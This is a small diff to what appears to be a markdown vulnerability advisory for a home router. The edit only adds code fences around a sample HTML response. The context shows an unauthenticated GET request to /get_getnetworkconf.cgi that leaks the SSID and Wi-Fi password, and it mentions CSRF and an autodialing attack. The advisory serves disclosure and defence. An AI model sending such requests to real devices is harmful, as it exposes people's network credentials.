@@ -46,6 +46,7 @@ When the victim visits the malicious site, it will create an autodialing profile
 	The webserver leaks access point security protocol, SSID, and password in plain text.
 	GET http://192.168.1.1/get_getnetworkconf.cgi
 
+``` html
 	<html>
 	<body>
 	Orange-SSID<BR>
@@ -57,7 +58,7 @@ When the victim visits the malicious site, it will create an autodialing profile
 	<BR>
 	</body>
 	</html>
-
+```
 
 
 **CWE-352**: *Cross-Site Request Forgery (CSRF): The web application does not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request. Allows an attacker to manipulate all configuration parameters.*
